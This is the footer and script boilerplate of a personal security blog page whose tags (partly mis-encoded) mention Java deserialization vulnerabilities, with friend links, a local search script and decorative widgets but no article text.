            <a class="tag" href="/tags/#JAVA" title="JAVA">JAVA</a>
            
            <a class="tag" href="/tags/#æ¼æ´" title="æ¼æ´">æ¼æ´</a>
            
            <a class="tag" href="/tags/#ååºåˆ—åŒ–" title="ååºåˆ—åŒ–">ååºåˆ—åŒ–</a>
            
          </div>
        </section>
        

        <!-- Friends Blog -->
        
        <hr>
        <h5>æœ‹å‹ä»¬</h5>
        <ul class="list-inline">

          
          <li>
            <a href="https://www.cnblogs.com/Yhck/" target="_blank">Yhck</a>
          </li>
          
          <li>
            <a href="https://www.cnblogs.com/wkzb/" target="_blank">beiwo</a>
          </li>
          
          <li>
            <a href="https://leohearts.com/" target="_blank">Leohearts</a>
          </li>
          
          <li>
            <a href="https://longlone.top/" target="_blank">Longlone</a>
          </li>
          
          <li>
            <a href="http://na0hblog.top/" target="_blank">Na0h</a>
          </li>
          
        </ul>
        
      </div>
    </div>
  </div>
</article>



<!-- anchorjs start -->
<!-- async load function -->
<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
<script type="text/javascript">
  // async load function
  function async (u, c) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) {
      o.addEventListener('load', function(e) {
        c(null, e);
      }, false);
    }
    s.parentNode.insertBefore(o, s);
  };
</script>
<script type="text/javascript">
  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
    anchors.options = {
      visible: 'hover',
      placement: 'left',
      // icon: 'â„¬'
      icon: 'â¡'
    };
    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
  });
</script>
<style>
  /* place left on bigger screen */
  @media all and (min-width: 800px) {
    .anchorjs-link {
      position: absolute;
      left: -0.75em;
      font-size: 1.1em;
      margin-top: -0.1em;
    }
  }
</style>

<!-- anchorjs end -->



		<!-- Footer (contains ThemeColorã€viewer) -->
		<!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center">
          

          
            <li>
              <a target="_blank" href="https://github.com/Morouu">
                <span class="fa-stack fa-lg">
                  <i class="fa fa-circle fa-stack-2x"></i>
                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                </span>
              </a>
            </li>
          

          

          

          

          

          

          

        </ul>
        <p class="copyright text-muted">
         &copy; 2022
		 <i class="icon-smile"></i>
          morouu
          <br>
          Theme by
          <a target="_blank" rel="noopener" href="http://beantech.org">BeanTech</a>
          <span style="display: inline-block; margin: 0 5px;">
            <i class="fa fa-heart"></i>
          </span>
          re-Ported by
          <a target="_blank" rel="noopener" href="https://v-vincen.life/">Live My Life</a>
          |
          <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="91px" height="20px" src="https://ghbtns.com/github-btn.html?user=V-Vincen&repo=V-Vincen.github.io&type=star&count=true"></iframe>
        <div class=" copyright text-muted live_time"><span>æœ¬åšå®¢å·²èŒèŒå“’åœ°è¿è¡Œ</span><span id="display_live_time"> 0 å¤© 0 å°æ—¶ 0 åˆ† 0 ç§’</span><span class="moe-text">(â—'â—¡'â—)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2021-12-27T20:23:15');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " å¤© " + passHour + " å°æ—¶ " + passMinute + " åˆ† " + passSecond + " ç§’";
}
blog_live_time();
</script></div>
		</p>
		
      </div>
    </div>
  </div>
</footer>

<a id="rocket" href="#top" class=""></a>


  <!-- jQuery -->
  <script type="text/javascript" src="/js/jquery.min.js"></script>
  <!-- Bootstrap Core JavaScript -->
  <script type="text/javascript" src="/js/bootstrap.min.js"></script>
  <!-- Custom Theme JavaScript -->
  <script type="text/javascript" src="/js/hux-blog.min.js"></script>
  <!-- catalog -->
  <script async="true" type="text/javascript" src="/js/catalog.js"></script>
  <!-- totop(rocket) -->
  <script async="true" type="text/javascript" src="/js/totop.js"></script>

  
    <!-- Busuanzi JavaScript -->
    <script async="async" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <!-- Scroll start -->
    <script async="async" type="text/javascript" src="/js/scroll.js"></script>
    <!-- Scroll end -->
  

  
    <!-- LangSelect start -->
    <script type="text/javascript" src="/js/langselect.js"></script>
    <!-- LangSelect end -->
  

  
    <!-- Mouseclick -->
    <script type="text/javascript" src="/js/mouseclick.js" content='' color=''></script>
  

  
    <!-- ribbon -->
    <script type="text/javascript" src="/js/ribbonDynamic.js"></script>
  

  
    <!-- Line start -->
    <script async="text/javascript" src="/js/line.js"></script>
    <!-- Line end -->
  






  <!-- viewer start -->
  <!-- viewer start (Picture preview) -->
  
    <script async="async" type="text/javascript" src="/js/viewer/viewer.min.js"></script>
    <script async="async" type="text/javascript" src="/js/viewer/pic-viewer.js"></script>
  

  <!-- viewer end -->


<script>
  // async load function
  function async (u, c) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) {
      o.addEventListener('load', function (e) {
        c(null, e);
      }, false);
    }
    s.parentNode.insertBefore(o, s);
  }

  // fastClick.js
  async ("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function () {
    var $nav = document.querySelector("nav");
    if ($nav)
      FastClick.attach($nav);
    }
  )
</script>

<!-- Because of the native support for backtick-style fenced code blocks right within the Markdown is landed in Github Pages, From V1.6, There is no need for Highlight.js, so Huxblog drops it officially. -
https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0 - https://help.github.com/articles/creating-and-highlighting-code-blocks/ -->
<!-- <script> async ("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function () { hljs.initHighlightingOnLoad(); }) </script> <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet"> -->

<!-- jquery.tagcloud.js -->
<!-- <script> // only load tagcloud.js in tag.html if ($('#tag_cloud').length !== 0) { async ("https://morblog.cc/js/jquery.tagcloud.js", function () { $.fn.tagcloud.defaults = { // size: { start: 1, end: 1, unit: 'em' }, color: {
start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </script> -->


		<!-- Search -->
		
		<div class="popup search-popup local-search-popup">
  <span class="popup-btn-close">
    ESC
  </span>
  <div class="container">
    <div class="row">
      <!-- <div class="col-md-9 col-md-offset-1"> -->
      <div class="col-lg-9 col-lg-offset-1 col-md-10 col-md-offset-1 local-search-content">

        <div class="local-search-header clearfix">

          <div class="local-search-input-wrapper">
            <span class="search-icon">
              <i class="fa fa-search fa-lg" style="margin: 25px 10px 25px 20px;"></i>
            </span>
            <input autocomplete="off" placeholder="æœç´¢..." type="text" id="local-search-input">
          </div>
        </div>
        <div id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>


  
    <script src="/js/ziploader.js"></script>
  
  <script>
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.json";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    // monitor main search box;
    var onPopupClose = function (e) {
      $('.popup').fadeOut(300);
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $('.popup').fadeIn(300);
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }
    // get search zip version
    $.get('/searchVersion.json?t=' + (+new Date()), function (res) {
      if (localStorage.getItem('searchVersion') !== res) {
        localStorage.setItem('searchVersion', res);
        initSearchJson();
      }
    });

    function initSearchJson() {
      initLoad(['/search.flv'], {
        loadOptions: {
          success: function (obj) {
            localStorage.setItem('searchJson', obj['search.json'])
          },
          error: function (e) {
            return console.log(e)
          }
        },
        returnOptions: {
          'json': TYPE_TEXT
        },
        mimeOptions: {
          'json': 'application/json'
        }
      })
    }
    // search function;
    var searchFunc = function (search_id, content_id) {
      'use strict';
      isfetched = true;
      var datas = JSON.parse(localStorage.getItem('searchJson'));
      // console.log(search_id)
      var input = document.getElementById(search_id);
      var resultContent = document.getElementById(content_id);
      var inputEventFunction = function () {
        var searchText = input.value.trim().toLowerCase();
        var keywords = searchText.split(/[\s\-]+/);
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        var resultItems = [];
        if (searchText.length > 0) {
          // perform local searching
          datas.forEach(function (data) {
            var isMatch = false;
            var hitCount = 0;
            var searchTextCount = 0;
            var title = data.title
              ? data.title.trim()
              : '';
            var titleInLowerCase = title.toLowerCase();
            var content = data.content
              ? data.content.trim().replace(/<[^>]+>/g, "")
              : '';
            var contentInLowerCase = content.toLowerCase();
            var articleUrl = decodeURIComponent(data.url);

            var date = data.date;
            var dateTime = date.replace(/T/, " ").replace(/.000Z/, "");
            var imgUrl = data.header_img;
            


            var indexOfTitle = [];
            var indexOfContent = [];
            // only match articles with not empty titles
            keywords.forEach(function (keyword) {
              function getIndexByWord(word, text, caseSensitive) {
                var wordLen = word.length;
                if (wordLen === 0) {
                  return [];
                }
                var startPosition = 0,
                  position = [],
                  index = [];
                if (!caseSensitive) {
                  text = text.toLowerCase();
                  word = word.toLowerCase();
                }
                while ((position = text.indexOf(word, startPosition)) > -1) {
                  index.push({position: position, word: word});
                  startPosition = position + wordLen;
                }
                return index;
              }
              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
            });
            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
              isMatch = true;
              hitCount = indexOfTitle.length + indexOfContent.length;
            }
            // show search results
            if (isMatch) {
              // sort index by position of keyword
              [indexOfTitle, indexOfContent].forEach(function (index) {
                index.sort(function (itemLeft, itemRight) {
                  if (itemRight.position !== itemLeft.position) {
                    return itemRight.position - itemLeft.position;
                  } else {
                    return itemLeft.word.length - itemRight.word.length;
                  }
                });
              });
              // merge hits into slices
              function mergeIntoSlice(text, start, end, index) {
                var item = index[index.length - 1];
                var position = item.position;
                var word = item.word;
                var hits = [];
                var searchTextCountInSlice = 0;
                while (position + word.length <= end && index.length != 0) {
                  if (word === searchText) {
                    searchTextCountInSlice++;
                  }
                  hits.push({position: position, length: word.length});
                  var wordEnd = position + word.length;
                  // move to next position of hit
                  index.pop();
                  while (index.length != 0) {
                    item = index[index.length - 1];
                    position = item.position;
                    word = item.word;
                    if (wordEnd > position) {
                      index.pop();
                    } else {
                      break;
                    }
                  }
                }
                searchTextCount += searchTextCountInSlice;
                return {hits: hits, start: start, end: end, searchTextCount: searchTextCountInSlice};
              }
              var slicesOfTitle = [];
              if (indexOfTitle.length != 0) {
                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
              }
              var slicesOfContent = [];
              while (indexOfContent.length != 0) {
                var item = indexOfContent[indexOfContent.length - 1];
                var position = item.position;
                var word = item.word;
                // cut out 100 characters
                var start = position - 20;
                var end = position + 80;
                if (start < 0) {
                  start = 0;
                }
                if (end < position + word.length) {
                  end = position + word.length;
                }
                if (end > content.length) {
                  end = content.length;
                }
                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
              }
              // sort slices in content by search text's count and hits' count
              slicesOfContent.sort(function (sliceLeft, sliceRight) {
                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                  return sliceRight.hits.length - sliceLeft.hits.length;
                } else {
                  return sliceLeft.start - sliceRight.start;
                }
              });
              // select top N slices in content
              var upperBound = parseInt('1');
              if (upperBound >= 0) {
                slicesOfContent = slicesOfContent.slice(0, upperBound);
              }
              // highlight title and content
              function highlightKeyword(text, slice) {
                var result = '';
                var prevEnd = slice.start;
                slice.hits.forEach(function (hit) {
                  result += text.substring(prevEnd, hit.position);
                  var end = hit.position + hit.length;
                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                  prevEnd = end;
                });
                result += text.substring(prevEnd, slice.end);
                return result;
              }
              var resultItem = '';

              // if (slicesOfTitle.length != 0) {   resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>"; } else {   resultItem += "<li><a target='_blank' href='" +
              // articleUrl + "' class='search-result-title'>" + title + "</a>"; } slicesOfContent.forEach(function (slice) {   resultItem += "<a target='_blank' href='" + articleUrl + "'><p class=\"search-result\">" + highlightKeyword(content, slice) +
              // "...</p></a>"; }); resultItem += "</li>";

              if (slicesOfTitle.length != 0) {
                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</div><time class='search-result-date'>" + dateTime + "</time>";
              } else {
                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + title + "</div><time class='search-result-date'>" + dateTime + "</time>";
              }
              slicesOfContent.forEach(function (slice) {
                resultItem += "<p class=\"search-result-content\">" + highlightKeyword(content, slice) + "...</p>";
              });
              resultItem += "</div><div class='search-result-right'><img class='media-image' src='" + imgUrl + "' width='64px' height='48px'></img></div></a>";

              resultItems.push({item: resultItem, searchTextCount: searchTextCount, hitCount: hitCount, id: resultItems.length});
            }
          })
        };

        if (keywords.length === 1 && keywords[0] === "") {
          resultContent.innerHTML = '<div id="no-result"></div>'
        } else if (resultItems.length === 0) {
          resultContent.innerHTML = '<div id="no-result"></div>'
        } else {
          resultItems.sort(function (resultLeft, resultRight) {
            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
              return resultRight.searchTextCount - resultLeft.searchTextCount;
            } else if (resultLeft.hitCount !== resultRight.hitCount) {
              return resultRight.hitCount - resultLeft.hitCount;
            } else {
              return resultRight.id - resultLeft.id;
            }
          });
          var searchResultList = '<div class=\"search-result-list\">';
          resultItems.forEach(function (result) {
            searchResultList += result.item;
          })
          searchResultList += "</div>";
          resultContent.innerHTML = searchResultList;
        }
      }
      if ('auto' === 'auto') {
        input.addEventListener('input', inputEventFunction);
      } else {
        $('.search-icon').click(inputEventFunction);
        input.addEventListener('keypress', function (event) {
          if (event.keyCode === 13) {
            inputEventFunction();
          }
        });
      }
      // remove loading animation
      $('body').css('overflow', '');
      proceedsearch();
    }
    // handle and trigger popup window;
    $('.popup-trigger').click(function (e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc('local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });
    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function (e) {
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 && $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });

    document.addEventListener('mouseup', (e) => {
      var _con = document.querySelector(".local-search-content");
      if (_con) {
        if (!_con.contains(e.target)) {
          onPopupClose();
        }
      }
    });
  </script>


		
	<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haru02.model.json"},"display":{"position":"right","width":225,"height":225,"right":125},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
